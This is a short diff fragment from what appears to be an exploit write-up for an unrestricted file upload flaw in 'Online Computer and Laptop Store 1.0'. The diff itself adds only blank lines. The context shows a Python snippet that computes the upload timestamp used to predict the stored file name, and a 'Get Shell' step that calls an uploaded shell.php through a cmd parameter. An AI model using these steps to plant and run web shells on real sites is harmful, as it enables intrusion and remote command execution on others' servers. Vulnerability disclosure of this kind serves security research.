@@ -12,9 +12,11 @@ Online Computer and Laptop Store 1.0 allows Unrestricted file upload and can lea
 
 import time
 
+
 timeArray = time.strptime('2023-04-24 13:40:00', "%Y-%m-%d %H:%M:%S")
 time_format= time.mktime(timeArray)
 print(int(time_format))
+
 
 3. Get Shell.
 http://192.168.3.43/php-ocls/uploads/1682314800_shell.php?cmd=phpinfo();
